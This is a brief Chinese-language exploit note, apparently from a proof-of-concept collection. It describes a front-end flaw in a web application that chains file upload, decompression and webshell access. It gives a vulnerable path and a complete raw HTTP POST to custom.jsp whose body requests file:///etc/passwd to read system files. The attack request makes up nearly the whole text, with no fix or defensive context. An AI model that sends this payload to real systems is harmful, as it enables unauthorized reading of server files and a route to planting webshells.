通过文件上传-->解压-->获取webshell，前台漏洞

漏洞路径：

```
/api///sys/ui/sys_ui_extend/sysUiExtend.do
```



```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: /
Connection: Keep-Alive
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
var={"body":{"file":"file:///etc/passwd"}}
```





